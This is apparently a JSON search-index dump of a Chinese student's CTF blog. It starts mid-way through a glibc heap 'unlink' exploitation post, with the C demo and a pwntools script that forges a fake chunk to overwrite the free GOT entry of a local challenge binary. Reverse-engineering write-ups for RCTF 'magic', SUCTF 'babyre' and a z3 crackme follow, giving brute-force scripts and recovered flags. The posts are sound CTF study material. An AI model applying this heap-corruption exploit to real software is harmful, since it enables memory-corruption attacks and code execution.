fprintf(stderr, \"The global chunk0_ptr is at %p, pointing to %p\\n\", &amp;chunk0_ptr, chunk0_ptr); fprintf(stderr, \"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr); fprintf(stderr, \"We create a fake chunk inside chunk0.\\n\"); fprintf(stderr, \"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n\"); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr, \"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n\"); fprintf(stderr, \"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n\"); chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, \"Fake chunk fd: %p\\n\",(void*) chunk0_ptr[2]); fprintf(stderr, \"Fake chunk bk: %p\\n\\n\",(void*) chunk0_ptr[3]); fprintf(stderr, \"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n\"); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr, \"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n\"); fprintf(stderr, \"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n\"); chunk1_hdr[0] = malloc_size; fprintf(stderr, \"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\\n\",(void*)chunk1_hdr[0]); fprintf(stderr, \"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\\n\\n\"); chunk1_hdr[1] &amp;= ~1; fprintf(stderr, \"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n\"); fprintf(stderr, \"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\"); free(chunk1_ptr); fprintf(stderr, \"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n\"); char victim_string[8]; strcpy(victim_string,\"Hello!~\"); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, \"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n\"); fprintf(stderr, \"Original value: %s\\n\",victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr, \"New Value: %s\\n\",victim_string);&#125; 当堆分配完的时候，内存分布可以表示为这样： 然后通过溢出，构造fake_chunk，并将&amp;chunk0_ptr-3*8和&amp;chunk_ptr-2*8作为其fd和bk，并修改chunk1的Pre size和Size的值。 在chunk0中布置好以后，需要把chunk1的pre size改掉，以及chunk1的size的最低为修改为0，表示前一个chunk是“空闲”的。然后free掉chunk1。触发unlink。最终使得chunk0_ptr指向&amp;chunk_ptr-3*8的位置。 然后就通过写入，把chunk0_ptr改成目标地址，然后再写入，修改目标地址的值。 可以看到成功了。 0x03 Demo在ida中可以看得出来，set函数是有问题的，可以发生溢出。 123456789101112ssize_t func_set_chunk()&#123; int v1; // [esp+Ch] [ebp-Ch] v1 = -1; write(1, \"Set chunk index:\", 0x10u); __isoc99_scanf(\"%d\", &amp;v1); if ( v1 &lt; 0 ) return write(1, \"Set chunk data error!\\n\", 0x16u); write(1, \"Set chunk data:\", 0xFu); return read(0, buf[v1], 0x400u);&#125; 是个萌新友好向的demo，可以试着修改一下free的got表的值。 利用脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/python#-*- coding:UTF-8 -*-from pwn import *p = process('./heap')elf = ELF('./heap')#context.log_level='debug'chunk_ptr = 0x08049D60def add_chk(size): p.recvuntil('5.Exit\\n') p.sendline('1') p.recvuntil('Input the size of chunk you want to add:') p.sendline(str(size))def set_chk(index,buff): p.recvuntil('5.Exit\\n') p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.send(buff)def del_chk(index): p.recvuntil('5.Exit\\n') p.sendline('3') p.recvuntil('Delete chunk index:') p.sendline(str(index))def pri_chk(index): p.recvuntil('5.Exit\\n') p.sendline('4') p.recvuntil('Print chunk index:') p.sendline(str(index))def exi_chk(): p.recvuntil('5.Exit\\n') p.sendline('5')add_chk(0x80)add_chk(0x80)add_chk(0x80)payload = p32(0) + p32(0)payload += p32(chunk_ptr - 12) + p32(chunk_ptr - 8)payload += '0'*0x70payload += p32(0x80) + p32(0x88)set_chk(0,payload)del_chk(1)#gdb.attach(p,'b *0x080486F8\\n')set_chk(0,'a'*12 + p32(elf.got['free']))set_chk(0,'aaaa')del_chk(2)p.interactive() 可以看到free的got表地址已经被修改了。 0x04 总结总共花了两天多的时间，除去记录以外，学习unlink的时间竟然大部分卡在了。。。这个fake chunk和要free的那一块这么合并啊？？？啊，菜得真实。。。其实完全不需要管后面到底怎么合并的嘛！ 其实这个demo的利用还没结束，最好还能任意代码执行，下次有时间再填坑好了（挖坑！接着挖坑！。","path":"2019/04/02/studypwn_unlink/","date":"04-02","excerpt":"啊，花了一天多的时间来弄懂unlink的原理和一个简单的应用。只能说，pwn真好玩，就是头上有点凉，就是我太菜了。写个学习笔记记录一下，以免忘了。。。"},{"title":"突然的更新","text":"欸，虽然早就觉得之前的blog的风格太死宅花里胡哨，但是已知没有换一个（其实想换的，但是正好赶上NexT的更新，就觉得要不再等等~然后就23333）这回趁着把主题换了，顺便写点，给新的一年，新学期的开始，开个好头。。。 更新了主题啊哈，NexT这个主题真的敲好看23333配置起来也挺方便的，就很开心。 未完的坑说起来，上个学期开了俩坑来着，一个是密码的总结，一个补题计划。。。但是，我觉得密码总结上写的好像哪都能找到。。。就打算换一种写法，写成不同的密码算法在汇编后的特征，这个倒是比较少，算是开的坑1。 另外一个补题计划，原本打算寒假补题来着，然后参加了美赛（逃不出卢浮宫的四天.jpg），然后要完成一个逆向任务，本来应该是很简单的，毕竟只要复现算法，也没有混淆啥的。。。但是代码写的时候弄错了类型大小= =。结果硬是一行一行调试对比才发现（喷血.jpg）。所以也没有补多少，佛了。 新坑首先，为打好三周后的比赛，要复现往年的逆向题和pwn题。。。鉴于自己菜鸡实力，得尽早完成才行。 然后，是一个我感觉比较有趣的新坑，想写一个多人在线打麻将的小程序。由于之前补完了天才麻将少女的番，感觉说不定有几个技能可以写出来实现一下，哦莫昔洛依desu。顺便提升一下python能力，还有接触一下网络编程方面的知识。 未完待续嗯哼，不知道能不能稳稳的前进呢。","path":"2019/03/05/a_new_term/","date":"03-05","excerpt":"欸，虽然早就觉得之前的blog的风格太死宅花里胡哨，但是已知没有换一个（其实想换的，但是正好赶上NexT的更新，就觉得要不再等等~然后就23333）这回趁着把主题换了，顺便写点，给新的一年，新学期的开始，开个好头。。。"},{"title":"magic","text":"这个题调得有点久23333 但是收获很大0v0 题目在此 先看看直接运行有警告（黑客做的东西一个都不能在实体机上打开.jpg 命令行运行试试 看这时间就很有意思啊orz 看来还得获取正确的时间 工具x64dbg &amp; IDA 漫长的调试之路 入口看起来就有点迷 步进以后是各种系统函数的开头ntdll.xxxxxxx开头的各种调用，开始慌了，但是这些应该都是系统调用，主要看的应该是magic.xxxxx这样的才对 然后就每个magic开头的调用都用ida找到对应的地址，分析一波函数，耗费无数时间和头发以后，终于来到一个奇妙的函数sub_402563，用ida看这个函数是这样子的： 这个看起来就很棒啊，然而看着一地的头发，我不禁陷入沉思：为什么不一开始就搜索字符串。。。 然后看这判断，一看就可以写脚本跑啊，然后 呵呵，摔(╯‵□′)╯︵┻━┻ 对不起我这一地头发！！！ 算了继续。 然后就接着单步，在wp的提醒下(羞愧，捂脸)，我学会了一边看控制台一边单步，来找到关键函数。。。（我还是太菜了 通过单步发现这个call输出了结果，最终结果是magic.402218输出的，但是ida分析后发现这个函数没有判断，然后就往上找可以找到magic.402268，然后ida打开，这就找到了判断时间的关键函数 很明显，byte_405020是密钥，通过与正确的时间作为种子所生成的随机数异或，然后调用另外一个函数sub_4027ED 仔细看可以看出来，Dst是个结构体，大小为12byte，是个有256个结构体的结构体数组，结构体大概长这样 12345struct Dst&#123; BYTE ch; DWORD mem1; DWORD mem2;&#125;; //由于对齐的原因，ch后补了3个空字节，DWORD占4个字节，所以总共是12个字节 对于每个结构体，ch被赋值为相应的异或后的结果，mem1赋值为0x7FFFFFFF，mem2赋值为0，然后就进入下个函数 还可以通过查看栈的位置，发现v2和v1其实分别是Dst[255]的mem1和mem2的值 sub_4026D0就是个对结构体的处理函数，于是就可以总结一哈： 时间在 0x5AFFE78F~0x5B028A8F 之间，并作为随机数种子 通过与一个字符数组的序列进行异或，生成一个结构体数组 结构体数组进行操作，可以得到v1、v2的值 v2的值实际上是Dst[255].mem1，并且应该等于0x700 于是，有了这些，就可以愉快的写脚本爆破了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;iomanip&gt;using namespace std;typedef unsigned char sngl;struct Ele&#123; char byte; //由于最开始写的时候把byte的类型设置为unsigned char int mem1; //硬是跑出包含正确种子在内的21个种子。。。 int mem2; //无法接受.jpg&#125;;sngl aim_table[]=&#123;0x58,0x71,0x8F,0x32,0x05,0x06,0x51,0xC7,0xA7,0xF8,0x3A,0xE1,0x06,0x48,0x82,0x09,0xA1,0x12,0x9F,0x7C,0xB8,0x2A,0x6F,0x95,0xFD,0xD0,0x67,0xC8,0xE3,0xCE,0xAB,0x12,0x1F,0x98,0x6B,0x14,0xEA,0x89,0x90,0x21,0x2D,0xFD,0x9A,0xBB,0x47,0xCC,0xEA,0x9C,0xD7,0x50,0x27,0xAF,0xB9,0x77,0xDF,0xC5,0xE9,0xE1,0x50,0xD3,0x38,0x89,0xEF,0x2D,0x72,0xC2,0xDF,0xF3,0x7D,0x7D,0x65,0x95,0xED,0x13,0x00,0x1C,0xA3,0x3C,0xE3,0x57,0xE3,0xF7,0xF7,0x2C,0x73,0x88,0x34,0xB1,0x62,0xD3,0x37,0x19,0x26,0xBE,0xB2,0x33,0x20,0x3F,0x60,0x39,0x87,0xA6,0x65,0xAD,0x73,0x1A,0x6D,0x49,0x33,0x49,0xC0,0x56,0x00,0xBE,0x0A,0xCF,0x28,0x7E,0x8E,0x69,0x87,0xE1,0x05,0x88,0xDA,0x54,0x3E,0x3C,0x0E,0xA9,0xFA,0xD7,0x7F,0x4E,0x44,0xC6,0x9A,0x0A,0xD2,0x98,0x6A,0xA4,0x19,0x6D,0x8C,0xE1,0xF9,0x30,0xE5,0xFF,0x33,0x4A,0xA9,0x52,0x3A,0x0D,0x67,0x20,0x1D,0xBF,0x36,0x3E,0xE8,0x56,0xBF,0x5A,0x88,0xA8,0x69,0xD6,0xAB,0x52,0xF1,0x14,0xF2,0xD7,0xEF,0x92,0xF7,0xA0,0x70,0xA1,0xEF,0xE3,0x1F,0x66,0x2B,0x97,0xF6,0x2B,0x30,0x0F,0xB0,0xB4,0xC0,0xFE,0xA6,0x62,0xFD,0xE6,0x4C,0x39,0xCF,0x20,0xB3,0x10,0x60,0x9F,0x34,0xBE,0xB2,0x1C,0x3B,0x6B,0x1D,0xDF,0x53,0x72,0xF2,0xFA,0xB1,0x51,0x82,0x04,0x30,0x56,0x1F,0x37,0x72,0x7A,0x97,0x50,0x29,0x86,0x4A,0x09,0x3C,0x59,0xC4,0x41,0x71,0xF8,0x1A,0xD2,0x30,0x88,0x63,0xFF,0x85,0xDE,0x24,0x8C,0xC3,0x37,0x14,0xC7&#125;;Ele *check(Ele *_struct,int index)&#123; Ele *result = NULL; if(index &gt;= 0 &amp;&amp; index &lt;= 255) result = &amp;_struct[index]; else memset(result, 0 ,sizeof(result)); return result;&#125;void work(Ele *dst,int idx)&#123; Ele *result = NULL; Ele *v3 = NULL; int v4; Ele *v5 = NULL; Ele *v6 = NULL; Ele *v7 = NULL; Ele *v8 = NULL; unsigned int index; v8 = dst; index = idx; result = check(v8,idx); v7 = result; if(result) &#123; if(index &amp; 0xF) v3 = check(v8,index-0x1); else v3 = 0x0; v6 = v3; if(index + 0xF &lt;= 0x1E) result = 0x0; else result = check(v8,index - 0x10); v5 = result; if(v6 || result) &#123; if(v6) &#123; v7-&gt;mem1 = v7-&gt;byte + v6-&gt;mem1; result = v7; v7-&gt;mem2 = 2 * v6-&gt;mem2; &#125; if(v5) &#123; v4 = v5-&gt;mem1 + v7-&gt;byte; if(v4 &lt; v7-&gt;mem1) &#123; v7-&gt;mem1 = v4; result = v7; v7-&gt;mem2 = 2 * v5-&gt;mem2 | 1; &#125; &#125; &#125; else &#123; result = v7; v7-&gt;mem1 = v7-&gt;byte; &#125; &#125; return;&#125;bool calculate(sngl str[])&#123; Ele *Dst; Dst = (Ele *)malloc(sizeof(Ele)*0x100); memset(Dst,0,0xC00); for(int i = 0;i &lt;= 255 ; i++) &#123; Dst[i].byte = str[i]; Dst[i].mem1 = 0x7FFFFFFF; Dst[i].mem2 = 0; work(Dst,i); &#125; if(Dst[255].mem1 == 0x700) return true; else return false; &#125;int main()&#123; unsigned int time; int cas = 0; for(time = 0x5AFFE790 ; time &lt; 0x5B028A8F ; time ++) &#123; srand(time); sngl table[256]; memcpy(table,aim_table,256); for(int i = 0 ; i &lt;= 255 ; i++) &#123; table[i] ^= rand(); &#125; if(calculate(table)) &#123; printf(\"0x%x\",time); break; &#125; &#125; return 0;&#125; //可以得到时间是0x5B00E398 然后就在magic._time64调用完后修改返回值 然后就单步，会找到一个需要输入的函数sub_4023B1，这里用到了回调的机制，真是打开了新世界的大门 依旧ida打开 可以看到输入是26个字符，然后对输入进行加密（我修改过函数名）然后一个判断，通过了以后再对加密串进行加密（可以猜测加密是异或之类的可以两次加密复原的那种），然后分析encode，发现确实是通过异或加密的。 然后再看sub_4029C7这个判断函数（只截了一部分） 看起来贼复杂（其实做起来也很复杂。。。啊我的头发 这里用到了setjmp和longjmp，大致上算是goto的升级版 其实相当于汇编机器码一样的，ins_table里存的就相当于指令，根据指令一个个进行操作，简化以后是这样 12345unsigned char arg = 0x66;ch += 0xCC;ch &amp;= 0xFF;ch ^= arg;arg = ~ arg; 由于密文也已经知道（key_word)就可以进行爆破正确的加密后的密文了（正确的输入没必要跑，因为可以通过程序自动第二次加密得到:P 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;int keyboard[]=&#123;0x89 ,0xC1 ,0xEC ,0x50 ,0x97 ,0x3A ,0x57 ,0x59 ,0xE4 ,0xE6 ,0xE4 ,0x42 ,0xCB,0xD9 ,0x08 ,0x22 ,0xAE ,0x9D ,0x7C ,0x07 ,0x80 ,0x8F ,0x1B ,0x45 ,0x04 ,0xE8&#125;;int main()&#123; char ans[26]; int arg[2] = &#123;0x66,0x99&#125;; for(int i = 0 ;i &lt; 26 ; i++) &#123; int j; int ch; for(j = 0x00;j &lt; 0xFF ; j++) &#123; ch = j; ch += 0xCC; ch &amp;= 0xFF; ch ^= arg[i%2]; if(ch == keyboard[i]) &#123; printf(\"%02x\",j); break; &#125; &#125; &#125; return 0; //238cbefd25d765f4b6b3b60fe174a2effc384ed21a4ab11096a5 &#125; 然后就在第一次加密后，将对应的内存修改为得到的字串 然后这时候就有神秘的情况出现，这是错误输入没有的 通过对比和分析机器码可以猜测，这个操作不重要，于是可以把出现除0的地方改成除1，由于除数也是机器码里的，所以直接通过修改内存就可以 然后继续步过，当再次通过加密函数的时候，可以看见内存里之前修改的部分已经变成了一半的flag。。。 然后注意控制台黑框框，继续步过 然后就能得到完整的输出 可以得到完整的flag是rctf{h@ck_For_fun_02508iO2_2iOR} 前面一部分可以通过眯眼看出来23333，像我就不一样，我取下眼镜就能直接看出来2333333 要不比划一下？ 收获这次的题目，我学到了挺多东西的，或许说是更熟练了（白学家gunna 对x64dbg这个工具用的更熟练了，毕竟调了快20个小时233333发现了之前没有用到过的操作 碰到了回调函数，知道了这种机制，以后碰到就有了方向 感受到了windows下逆向的便捷，x86dbg和ida一起用起来如有神助（然而这和我是个菜鸡有什么关系呢.jpg 学到了setjmp()和longjmp()的操作 看到了结构体在内存中的存储方式 又一次分析了模拟计算机机器码的操作，下次碰到争取不慌XD","path":"2018/07/29/magic/","date":"07-29","excerpt":"这个题调得有点久23333 但是收获很大0v0"},{"title":"babyre","text":"又开始口胡了 这个题是18年SUCTF的题，我当时当然一下子就看出来放弃了，毕竟那时候比现在还要菜(现在也很菜就是了)。。。 题目在这 看题题目说的是现有一个加密后的密文和加密程序，需要得到明文 这次会长抛给这道题的时候我以为是那种把加密过程逆一下的那种加密（之前做过逆加密的题），然后看那段加密看了很久，很久，很久，妈耶完全做不出来好嘛(ノ=Д=)ノ┻━┻ 然后，会长说这不是逆加密，用爆破就好了。。。 然后，好的，我这就去试试。。。 一顿分析打开ida，熟练地按下F5 虽说之前逆加密过程的想法是错的，但至少得到了点东西，比如 这么多函数连同srand在内只有operate有用。。。看了挺久才发现233333 进入operate函数就能看到我们的加密函数了，进去看看就会发现 它是单字节加密的，所以就可以爆破，四个字节以内的都能爆破。 脚本我把out里的密文按照unsigned int 的大小分开了 12345678910111213141516171819202122232425262728293031323334353637unsigned int num[]=&#123; 0xB80C91FE,0x70573EFE,0xBEED92AE,0x7F7A8193, 0x7390C17B,0x90347C6C,0xAA7A15DF,0xAA7A15DF, 0x526BA076,0x153F1A32,0x545C15AD,0x7D8AA463, 0x526BA076,0xFBCB7AA0,0x7D8AA463,0x9C513266, 0x526BA076,0x6D7DF3E1,0xAA7A15DF,0x9C513266, 0x1EDC3864,0x9323BC07,0x7D8AA463,0xFBCB7AA0, 0x153F1A32,0x526BA076,0xF5650025,0xAA7A15DF, 0x1EDC3864,0xB13AD888,0&#125;; unsigned __int64 constant = 0x1D082C23A72BE4C1;unsigned __int64 v5;unsigned int res;for(unsigned int i=0;num[i]!=0;i++)&#123; int ans; for(ans=0x20;ans&lt;0x7f;ans++) &#123; res = ans; for(unsigned int j=0;j&lt;=0x20f;++j) &#123; v5 = constant &gt;&gt; (j &amp; 0x1f); if(j &amp; 0x20) LODWORD(v5) = HIDWORD(v5); res = (res &gt;&gt; 1) ^ (((unsigned int)v5 ^ res ^ (res &gt;&gt; 16) ^ (1551120942 &gt;&gt; (((res &gt;&gt; 1) &amp; 1) + 2 * (2 * (((v9 &gt;&gt; 20) &amp; 1) + 2 * (2 * (v9 &gt;&gt; 31) + ((v9 &gt;&gt; 26) &amp; 1))) + ((v9 &gt;&gt; 9) &amp; 1))))) &lt;&lt; 31); &#125; if(res == num[i]) &#123; printf(\"%c\",ans); //跑完flag就出来了 break; &#125; &#125;&#125; 另外一个石乐志的做法我开始写脚本的时候，把ans循环里0x7F中把F看成跟L这类符号一样的符号了，本着化简的想法（然而我下面一行的0x1F却完全没有化简的想法），就把F删了。。。删了。。。删了。。。正当我看着跑出来的乱码迷得一比的时候，我发现，我可以把ASCII码表加密一遍啊！卧槽，我真机(shi)智！ 由之前的分析，进入加密函数之前有两次输入，第一次是输入任意字符串，第二次输入一个数seed，必须满足9&lt;n&lt;=32。然后每次只能加密30个字符。 然后就开始了快(you)乐(du)的加密，把ASCII码表从0x21开始到0x7F的可打印字符加密出来，然后一个个和密文比对，也能得出flag。 123456for(int i=0;num[i]!=0;i++) &#123; for(int j=0;j&lt;95;j++) //num储存ASCII可打印字符加密结果 if(num[i] == ans[j]) //ans储存密文 printf(\"%c\",j+33); //ASCII可打印字符（不算空格，空格是0x20)从0x21（33）开始， &#125; 总结这个题，貌似是签到题，所以并不是很复杂，我找对方向以后也就用了一个晚上的时间(当然，没找对方向的时候用了几天。。。也没做出来) 果然，reverse的题花样还是很多的，而且一道题说不定有比较简单的方式，比如这道题可以啥也不管直接加密ASCII码表然后对比2333333，当然这是事后才知道哈哈哈","path":"2018/07/09/babyre/","date":"07-09","excerpt":"又开始口胡了"},{"title":"Reverse","text":"本辣鸡要开始口胡了 前几天会长发了道练习题，本萌新尝试着做了一下，然后 第一次完全自己做出题真tm开心 题目在这 随便看看在Ubuntu里file得知是64位的文件 运行下试试 看起来就是要找到密码 废话！ 一顿分析用IDA打开 发现 密码长度为32个字符串 每4位组合成一个int类型的值 判断总共是8个方程 前四个int类型的数异或以后当成rand的种子 工具 python的z3-solver库，linux下的 脚本 前四位（a,b,c,d) 12345678910#!/usr/bin/env pythonfrom z3 import *a = Int('a')b = Int('b')c = Int('c')d = Int('d')solve(b*a-c*d == 0x24CDF2E7C953DA56, 3*c+4*d-b-2*a == 0x17B85F06, 3*a*d-c*b == 0x2E6E497E6415CF3E, 27*b+a-11*d-c == 0x95AE13337) ​ 解出来就得到密码前16位 后四位（e,f,g,h） 按照只要种子一样，得到的随机数数列也是相同的，所以很容易得到它的那些参数，但是这里我踩了个坑 这里随机数要用gdb单步出来 我开始没在Ubuntu里，在Windows下用C语言写的，然后得到的参数根本解不出来。。。 只要把前十六位解出来转换成字符串，再加上16位任意字符，凑成32位的密码，关注得到随机参数时eax的值，记录下来就是了，顺便还能检查一下前十六位有没有解错（解错会有跳转 至于为什么，其实我也不知道大概是因为系统不同吧 12345678910#!/usr/bin/env pythonfrom z3 import *e = Int('e')f = Int('f')g = Int('g')h = Int('h')solve(h*0x27+e*0x16-f-g == 0xE638C96D3, h+e+g*0x2d-f*0x2d == 0xB59F2D0CB, e*0x23+f*0x29-g-h == 0xDCFE88C6D, g*0x24+e-f-h*0xd == 0xC076D98BB) ​ 同样，跑出来就是密码后16位 密码 将32位都跑出来以后，直接转换成字符串，就能得到密码 12345int i;int sum[32]=&#123;0x61,0x6D,0x70,0x6F,0x5A,0x32,0x5A,0x6B,0x4E,0x6E,0x6B,0x31,0x4E,0x48,0x6C,0x33, 0x4E,0x54,0x63,0x30,0x4E,0x54,0x63,0x31,0x5A,0x33,0x4E,0x6F,0x61,0x47,0x46,0x47&#125;;for(i=0;i&lt;32;i++) printf(\"%c\",sum[i]); 结果然后就是激动人心的得到falg的过程了 看来没错了 总结​ 这个题讲真，虽然是很简单的那种题毕竟连我都会，但是那种激动的感觉真的没法用言语说明，就像发现新大陆的感觉，也可能是那种学了这么久能独立写出题的快乐吧","path":"2018/07/09/Reverse/","date":"07-09","excerpt":"本辣鸡要开始口胡了 前几天会长发了道练习题，本萌新尝试着做了一下，然后 第一次完全自己做出题真tm开心"},{"title":"Hello World","text":"ctf萌新报道！ 开这个blog是为了记录我写不出来和没过的题，顺便写点总结啥的 十分感谢 codgician 大佬的无私帮助，才能顺利搭好这个blog~ %%%%%%% 就跟每个语言的初学者的第一份代码一样 Hello World！Hello world~","path":"2018/07/08/hello-world/","date":"07-08","excerpt":"ctf萌新报道！ 开这个blog是为了记录我写不出来和没过的题，顺便写点总结啥的"}]}